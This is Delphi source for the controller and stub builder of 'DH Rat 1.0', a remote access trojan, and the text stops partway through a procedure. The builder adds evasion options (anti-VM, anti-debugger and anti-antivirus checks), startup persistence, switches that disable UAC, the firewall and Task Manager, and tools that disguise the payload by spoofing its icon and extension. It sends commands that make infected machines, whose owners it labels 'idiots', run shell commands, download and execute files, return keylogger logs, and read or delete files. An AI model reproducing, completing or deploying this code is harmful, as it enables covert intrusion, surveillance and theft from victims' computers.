{

  This software is Copyright (c) 2015 by Doddy Hackman.

  This is free software, licensed under:

  The Artistic License 1.0

  The Artistic License

  Preamble

  The intent of this document is to state the conditions under which a Package
  may be copied, such that the Copyright Holder maintains some semblance of
  artistic control over the development of the package, while giving the users of
  the package the right to use and distribute the Package in a more-or-less
  customary fashion, plus the right to make reasonable modifications.

  Definitions:

  - "Package" refers to the collection of files distributed by the Copyright
  Holder, and derivatives of that collection of files created through
  textual modification.
  - "Standard Version" refers to such a Package if it has not been modified,
  or has been modified in accordance with the wishes of the Copyright
  Holder.
  - "Copyright Holder" is whoever is named in the copyright or copyrights for
  the package.
  - "You" is you, if you're thinking about copying or distributing this Package.
  - "Reasonable copying fee" is whatever you can justify on the basis of media
  cost, duplication charges, time of people involved, and so on. (You will
  not be required to justify it to the Copyright Holder, but only to the
  computing community at large as a market that must bear the fee.)
  - "Freely Available" means that no fee is charged for the item itself, though
  there may be fees involved in handling the item. It also means that
  recipients of the item may redistribute it under the same conditions they
  received it.

  1. You may make and give away verbatim copies of the source form of the
  Standard Version of this Package without restriction, provided that you
  duplicate all of the original copyright notices and associated disclaimers.

  2. You may apply bug fixes, portability fixes and other modifications derived
  from the Public Domain or from the Copyright Holder. A Package modified in such
  a way shall still be considered the Standard Version.

  3. You may otherwise modify your copy of this Package in any way, provided that
  you insert a prominent notice in each changed file stating how and when you
  changed that file, and provided that you do at least ONE of the following:

  a) place your modifications in the Public Domain or otherwise make them
  Freely Available, such as by posting said modifications to Usenet or an
  equivalent medium, or placing the modifications on a major archive site
  such as ftp.uu.net, or by allowing the Copyright Holder to include your
  modifications in the Standard Version of the Package.

  b) use the modified Package only within your corporation or organization.

  c) rename any non-standard executables so the names do not conflict with
  standard executables, which must also be provided, and provide a separate
  manual page for each non-standard executable that clearly documents how it
  differs from the Standard Version.

  d) make other distribution arrangements with the Copyright Holder.

  4. You may distribute the programs of this Package in object code or executable
  form, provided that you do at least ONE of the following:

  a) distribute a Standard Version of the executables and library files,
  together with instructions (in the manual page or equivalent) on where to
  get the Standard Version.

  b) accompany the distribution with the machine-readable source of the Package
  with your modifications.

  c) accompany any non-standard executables with their corresponding Standard
  Version executables, giving the non-standard executables non-standard
  names, and clearly documenting the differences in manual pages (or
  equivalent), together with instructions on where to get the Standard
  Version.

  d) make other distribution arrangements with the Copyright Holder.

  5. You may charge a reasonable copying fee for any distribution of this
  Package.  You may charge any fee you choose for support of this Package. You
  may not charge a fee for this Package itself. However, you may distribute this
  Package in aggregate with other (possibly commercial) programs as part of a
  larger (possibly commercial) software distribution provided that you do not
  advertise this Package as a product of your own.

  6. The scripts and library files supplied as input to or produced as output
  from the programs of this Package do not automatically fall under the copyright
  of this Package, but belong to whomever generated them, and may be sold
  commercially, and may be aggregated with this Package.

  7. C or perl subroutines supplied by you and linked into this Package shall not
  be considered part of this Package.

  8. The name of the Copyright Holder may not be used to endorse or promote
  products derived from this software without specific prior written permission.

  9. THIS PACKAGE IS PROVIDED "AS IS" AND WITHOUT ANY EXPRESS OR IMPLIED
  WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
  MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.

  The End

}

// DH Rat 1.0
// (C) Doddy Hackman 2015

unit rat;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls,
  Vcl.ExtCtrls,
  Vcl.Menus, System.Win.ScktComp, builder_tools, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP, auxiliar_tools, Vcl.Imaging.pngimage,
  ShellApi;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    idiots_found_now: TGroupBox;
    status: TStatusBar;
    GroupBox2: TGroupBox;
    console: TMemo;
    PageControl2: TPageControl;
    TabSheet4: TTabSheet;
    W: TTabSheet;
    TabSheet6: TTabSheet;
    GroupBox3: TGroupBox;
    ip: TEdit;
    GroupBox4: TGroupBox;
    hide_file: TCheckBox;
    startup: TCheckBox;
    GroupBox5: TGroupBox;
    paths: TComboBox;
    path: TEdit;
    GroupBox6: TGroupBox;
    folder: TEdit;
    TabSheet5: TTabSheet;
    TabSheet7: TTabSheet;
    TabSheet8: TTabSheet;
    use_file_pumper: TCheckBox;
    GroupBox7: TGroupBox;
    GroupBox8: TGroupBox;
    count: TEdit;
    UpDown1: TUpDown;
    types: TComboBox;
    use_extension_spoofer: TCheckBox;
    GroupBox9: TGroupBox;
    extensions: TComboBox;
    generate: TButton;
    GroupBox11: TGroupBox;
    ruta_icono: TEdit;
    load: TButton;
    GroupBox12: TGroupBox;
    use_icon_changer: TCheckBox;
    preview: TImage;
    GroupBox13: TGroupBox;
    GroupBox14: TGroupBox;
    virtual_pc: TCheckBox;
    virtual_box: TCheckBox;
    kaspersky: TCheckBox;
    wireshark: TCheckBox;
    ollydbg: TCheckBox;
    anubis: TCheckBox;
    debug: TCheckBox;
    uac: TCheckBox;
    firewall: TCheckBox;
    cmd: TCheckBox;
    run: TCheckBox;
    regedit: TCheckBox;
    taskmgr: TCheckBox;
    updates: TCheckBox;
    TabSheet9: TTabSheet;
    GroupBox15: TGroupBox;
    menu: TPopupMenu;
    StartServer1: TMenuItem;
    StopServer1: TMenuItem;
    opciones: TPopupMenu;
    Files1: TMenuItem;
    Process1: TMenuItem;
    Command1: TMenuItem;
    Disables1: TMenuItem;
    Jokes1: TMenuItem;
    Others1: TMenuItem;
    Keylogger1: TMenuItem;
    ListFiles1: TMenuItem;
    ReadFile1: TMenuItem;
    DeleteFile1: TMenuItem;
    ListProcess1: TMenuItem;
    KillProcess1: TMenuItem;
    Firewall1: TMenuItem;
    Active1: TMenuItem;
    Disable1: TMenuItem;
    Regedit1: TMenuItem;
    Active2: TMenuItem;
    Disable2: TMenuItem;
    CD1: TMenuItem;
    Open1: TMenuItem;
    Close1: TMenuItem;
    Icons1: TMenuItem;
    Show1: TMenuItem;
    Hide1: TMenuItem;
    askbar1: TMenuItem;
    Show2: TMenuItem;
    Hide2: TMenuItem;
    Messages1: TMenuItem;
    SendKeys1: TMenuItem;
    Write1: TMenuItem;
    OpenWord1: TMenuItem;
    Crazy1: TMenuItem;
    Mouse1: TMenuItem;
    Hour1: TMenuItem;
    Manager1: TMenuItem;
    Shutdown1: TMenuItem;
    Reboot1: TMenuItem;
    Closesession1: TMenuItem;
    OpenURL1: TMenuItem;
    LoadPaint1: TMenuItem;
    Changetexttaskbar1: TMenuItem;
    urnoffmonitor1: TMenuItem;
    PlayBeeps1: TMenuItem;
    List1: TMenuItem;
    Drives1: TMenuItem;
    Services1: TMenuItem;
    Windows1: TMenuItem;
    DownloadandExecute1: TMenuItem;
    server: TServerSocket;
    idiots: TListView;
    Speak1: TMenuItem;
    notificar: TTrayIcon;
    console_options: TPopupMenu;
    Clear1: TMenuItem;
    Active3: TMenuItem;
    Disable3: TMenuItem;
    nave: TIdHTTP;
    select_path: TRadioButton;
    i_use_this: TRadioButton;
    select_extension: TRadioButton;
    use_this_extension: TRadioButton;
    extension: TEdit;
    archivo: TOpenDialog;
    Uninstaller1: TMenuItem;
    logo: TImage;
    about: TImage;
    Memo1: TMemo;
    vmware: TCheckBox;
    procedure StartServer1Click(Sender: TObject);
    procedure StopServer1Click(Sender: TObject);
    procedure serverClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure serverClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Command1Click(Sender: TObject);
    procedure Mouse1Click(Sender: TObject);
    procedure DeleteFile1Click(Sender: TObject);
    procedure Hide2Click(Sender: TObject);
    procedure Hide1Click(Sender: TObject);
    procedure ListProcess1Click(Sender: TObject);
    procedure OpenWord1Click(Sender: TObject);
    procedure KillProcess1Click(Sender: TObject);
    procedure Keylogger1Click(Sender: TObject);
    procedure ListFiles1Click(Sender: TObject);
    procedure Messages1Click(Sender: TObject);
    procedure Open1Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure ReadFile1Click(Sender: TObject);
    procedure Write1Click(Sender: TObject);
    procedure Show2Click(Sender: TObject);
    procedure Show1Click(Sender: TObject);
    procedure Speak1Click(Sender: TObject);
    procedure notificarClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Clear1Click(Sender: TObject);
    procedure Active1Click(Sender: TObject);
    procedure Disable1Click(Sender: TObject);
    procedure Active2Click(Sender: TObject);
    procedure Disable2Click(Sender: TObject);
    procedure Hour1Click(Sender: TObject);
    procedure urnoffmonitor1Click(Sender: TObject);
    procedure Shutdown1Click(Sender: TObject);
    procedure Reboot1Click(Sender: TObject);
    procedure Closesession1Click(Sender: TObject);
    procedure OpenURL1Click(Sender: TObject);
    procedure LoadPaint1Click(Sender: TObject);
    procedure Active3Click(Sender: TObject);
    procedure Disable3Click(Sender: TObject);
    procedure PlayBeeps1Click(Sender: TObject);
    procedure Drives1Click(Sender: TObject);
    procedure Services1Click(Sender: TObject);
    procedure Windows1Click(Sender: TObject);
    procedure DownloadandExecute1Click(Sender: TObject);
    procedure ipDblClick(Sender: TObject);
    procedure generateClick(Sender: TObject);
    procedure loadClick(Sender: TObject);
    procedure serverListen(Sender: TObject; Socket: TCustomWinSocket);
    procedure Uninstaller1Click(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  idiots_found: integer;
  argumento1: string;
  argumento2: string;

implementation

{$R *.dfm}
// Functions

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Write(ar, texto);
  CloseFile(ar);

end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

//

procedure TForm1.Clear1Click(Sender: TObject);
begin
  console.Lines.Clear;
  console.Lines.Add(' - DH Rat - Command Console - ');
  console.Lines.Add('Running program version 1.0');
  console.Lines.Add('-----------------------------------' + sLineBreak);
  console.Lines.Add('Welcome to hell' + sLineBreak);
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  console.Lines.Clear;
  console.Lines.Add(' - DH Rat - Command Console - ');
  console.Lines.Add('Running program version 1.0');
  console.Lines.Add('-----------------------------------' + sLineBreak);
  console.Lines.Add('Welcome to hell' + sLineBreak);
end;

procedure TForm1.generateClick(Sender: TObject);
var
  stub_generado: string;
  configuration: string;
  port: string;
  extraction_config: string;
  antis_config: string;
  disables_config: string;
  linea: string;
  linea_final: string;

  //
var
  op_hide_file: string;
  op_startup: string;
  op_select_path: string;
  op_i_use_this: string;
  op_virtual_pc: string;
  op_virtual_box: string;
  op_debug: string;
  op_wireshark: string;
  op_ollydbg: string;
  op_anubis: string;
  op_kaspersky: string;
  op_vmware: string;
  op_uac: string;
  op_firewall: string;
  op_cmd: string;
  op_run: string;
  op_taskmgr: string;
  op_regedit: string;
  op_updates: string;
  //

begin

  stub_generado := 'server_ready.exe';

  port := '11666'; // Edit

  //

  if (hide_file.Checked) then
  begin
    op_hide_file := '1';
  end
  else
  begin
    op_hide_file := '0';
  end;

  if (startup.Checked) then
  begin
    op_startup := '1';
  end
  else
  begin
    op_startup := '0';
  end;

  if (select_path.Checked) then
  begin
    op_select_path := '1';
  end
  else
  begin
    op_select_path := '0';
  end;

  if (i_use_this.Checked) then
  begin
    op_i_use_this := '1';
  end
  else
  begin
    op_i_use_this := '0';
  end;

  if (virtual_pc.Checked) then
  begin
    op_virtual_pc := '1';
  end
  else
  begin
    op_virtual_pc := '0';
  end;

  if (virtual_box.Checked) then
  begin
    op_virtual_box := '1';
  end
  else
  begin
    op_virtual_box := '0';
  end;

  if (debug.Checked) then
  begin
    op_debug := '1';
  end
  else
  begin
    op_debug := '0';
  end;

  if (wireshark.Checked) then
  begin
    op_wireshark := '1';
  end
  else
  begin
    op_wireshark := '0';
  end;

  if (ollydbg.Checked) then
  begin
    op_ollydbg := '1';
  end
  else
  begin
    op_ollydbg := '0';
  end;

  if (anubis.Checked) then
  begin
    op_anubis := '1';
  end
  else
  begin
    op_anubis := '0';
  end;

  if (kaspersky.Checked) then
  begin
    op_kaspersky := '1';
  end
  else
  begin
    op_kaspersky := '0';
  end;

  if (vmware.Checked) then
  begin
    op_vmware := '1';
  end
  else
  begin
    op_vmware := '0';
  end;

  if (uac.Checked) then
  begin
    op_uac := '1';
  end
  else
  begin
    op_uac := '0';
  end;

  if (firewall.Checked) then
  begin
    op_firewall := '1';
  end
  else
  begin
    op_firewall := '0';
  end;

  if (cmd.Checked) then
  begin
    op_cmd := '1';
  end
  else
  begin
    op_cmd := '0';
  end;

  if (run.Checked) then
  begin
    op_run := '1';
  end
  else
  begin
    op_run := '0';
  end;

  if (taskmgr.Checked) then
  begin
    op_taskmgr := '1';
  end
  else
  begin
    op_taskmgr := '0';
  end;

  if (regedit.Checked) then
  begin
    op_regedit := '1';
  end
  else
  begin
    op_regedit := '0';
  end;

  if (updates.Checked) then
  begin
    op_updates := '1';
  end
  else
  begin
    op_updates := '0';
  end;

  //

  configuration := '[ip]' + ip.text + '[ip]' + '[port]' + port + '[port]';

  configuration := configuration + '[hide_file]' + op_hide_file + '[hide_file]'
    + '[startup]' + op_startup + '[startup]';
  extraction_config := '[op_select_path]' + op_select_path + '[op_select_path]'
    + '[op_i_use_this]' + op_i_use_this + '[op_i_use_this]' + '[paths]' +
    paths.text + '[paths]' + '[path]' + path.text + '[path]' + '[folder]' +
    folder.text + '[folder]';

  antis_config := '[op_virtual_pc]' + op_virtual_pc + '[op_virtual_pc]' +
    '[op_virtual_box]' + op_virtual_box + '[op_virtual_box]' + '[op_debug]' +
    op_debug + '[op_debug]' + '[op_wireshark]' + op_wireshark + '[op_wireshark]'
    + '[op_ollydbg]' + op_ollydbg + '[op_ollydbg]' + '[op_anubis]' + op_anubis +
    '[op_anubis]' + '[op_kaspersky]' + op_kaspersky + '[op_kaspersky]' +
    '[op_vmware]' + op_vmware + '[op_vmware]';

  disables_config := '[op_uac]' + op_uac + '[op_uac]' + '[op_firewall]' +
    op_firewall + '[op_firewall]' + '[op_cmd]' + op_cmd + '[op_cmd]' +
    '[op_run]' + op_run + '[op_run]' + '[op_taskmgr]' + op_taskmgr +
    '[op_taskmgr]' + '[op_regedit]' + op_regedit + '[op_regedit]' +
    '[op_updates]' + op_updates + '[op_updates]';

  linea := configuration + extraction_config + antis_config + disables_config;
  linea_final := '[63686175]' + linea + '[63686175]';

  DeleteFile(stub_generado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'Data/stub.exe'),
    PChar(ExtractFilePath(Application.ExeName) + '/' + stub_generado), True);

  if (escribir_recurso(stub_generado, linea_final, 666)) then
  begin

    if (use_file_pumper.Checked) then
    begin
      if (file_pumper(stub_generado, count.text, types.text)) then
      begin
        status.Panels[0].text := '[+] File Pumper';
        status.Update;
      end
      else
      begin
        status.Panels[0].text := '[-] Error with File Pumper';
        status.Update;
      end;
    end;

    if (use_icon_changer.Checked) then
    begin
      if (change_icon(stub_generado, ruta_icono.text)) then
      begin
        status.Panels[0].text := '[+] Icon Changed';
        status.Update;
      end
      else
      begin
        status.Panels[0].text := '[-] Error with Icon Changer';
        status.Update;
      end;
    end;

    if (use_extension_spoofer.Checked) then
    begin
      if (select_extension.Checked) then
      begin
        if (extension_changer(stub_generado, extensions.text)) then
        begin
          status.Panels[0].text := '[+] Extension Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].text := '[-] Error with Extension Changer';
          status.Update;
        end;
      end;
      if (use_this_extension.Checked) then
      begin
        if (extension_changer(stub_generado, extension.text)) then
        begin
          status.Panels[0].text := '[+] Extension Changed';
          status.Update;
        end
        else
        begin
          status.Panels[0].text := '[-] Error with Extension Changer';
          status.Update;
        end;
      end;
    end;

    status.Panels[0].text := '[+] Done';
    status.Update;

    MessageBox(0, 'Stub Generated', 'DH Rat 1.0', MB_ICONINFORMATION);

  end
  else
  begin
    ShowMessage('Error');
  end;

  //

end;

procedure TForm1.Close1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![closecd]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Closesession1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![cerrar_sesion]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Command1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Command', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![ejecutar] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.DeleteFile1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'File', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![borraresto] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Active1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![firewall_on]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Active2Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![regedit_on]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Active3Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Text', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![edit_text_taskbar_on] [argumento1]' + argumento1 +
      '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Disable1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![firewall_off]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Disable2Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![regedit_off]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Disable3Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![edit_text_taskbar_off]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.DownloadandExecute1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Link', '');
    argumento2 := InputBox('DH Rat', 'New name', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![download_and_execute] [argumento1]' + argumento1 +
      '[argumento1] [argumento2]' + argumento2 + '[argumento2]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Drives1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![get_drives]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Hide1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![ocultariconos]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Hide2Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![ocultartaskbar]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Hour1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Time', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![crazy_hour] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.ipDblClick(Sender: TObject);
var
  code, ip_found: string;
begin

  code := nave.Get('http://whatismyipaddress.com/');

  ip_found := regex(code, 'alt="Click for more about ', '"></a>');

  ip.text := ip_found;

end;

procedure TForm1.Keylogger1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![keyloggerlogs]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.KillProcess1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Name', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![matarproceso] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.ListFiles1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Directory', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![listardirectorio] [argumento1]' + argumento1 +
      '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.ListProcess1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![listarprocesos]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.loadClick(Sender: TObject);
begin
  archivo.InitialDir := GetCurrentDir;
  archivo.Filter := 'ICO|*.ico|';

  if archivo.Execute then
  begin
    preview.Picture.LoadFromFile(archivo.filename);
    ruta_icono.text := archivo.filename;
  end;
end;

procedure TForm1.LoadPaint1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![abrir_paint]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Messages1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Title', '');
    argumento2 := InputBox('DH Rat', 'Text', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![mensaje] [argumento1]' + argumento1 +
      '[argumento1] [argumento2]' + argumento2 + '[argumento2]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Mouse1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Number', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![crazymouse] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.notificarClick(Sender: TObject);
begin
  Show();
  WindowState := wsNormal;
  Application.BringToFront();
end;

procedure TForm1.Open1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![opencd]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.OpenURL1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'URL', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![abrir_url] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.OpenWord1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Keys', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![escribirword] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.PlayBeeps1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Count', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![play_beep] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.ReadFile1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'File', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![leerarchivo] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Reboot1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![reiniciar]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Windows1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![get_windows]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Write1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Keys', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![sendkeys] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Services1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![get_services]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Show1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![volvericonos]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Show2Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![volvertaskbar]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Shutdown1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![apagar]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Speak1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    argumento1 := InputBox('DH Rat', 'Text', '');
    server.Socket.Connections[idiots.Itemindex]
      .SendText('![hablar] [argumento1]' + argumento1 + '[argumento1]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.urnoffmonitor1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![apagar_monitor]');
  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.Uninstaller1Click(Sender: TObject);
begin
  if not(idiots.Itemindex = -1) then
  begin
    server.Socket.Connections[idiots.Itemindex].SendText('![uninstaller]');
    idiots.DeleteSelected;
    idiots_found := idiots_found - 1;
    idiots_found_now.Caption := 'Idiots found : ' + IntToStr(idiots_found);

  end
  else
  begin
    MessageBox(0, 'Idiot not found', 'DH Rat 1.0', MB_ICONERROR);
  end;
end;

procedure TForm1.serverClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  with idiots.Items.Add do
  begin
    Inc(idiots_found);
    Caption := IntToStr(idiots_found);
    SubItems.Add(Socket.RemoteHost);
    SubItems.Add('?');
    SubItems.Add('?');
    SubItems.Add('?');
    SubItems.Add('?');
  end;
end;

procedure TForm1.serverClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  code: string;
  host: string;
  ip: string;
  pais: string;
  username: string;
  os: string;

begin
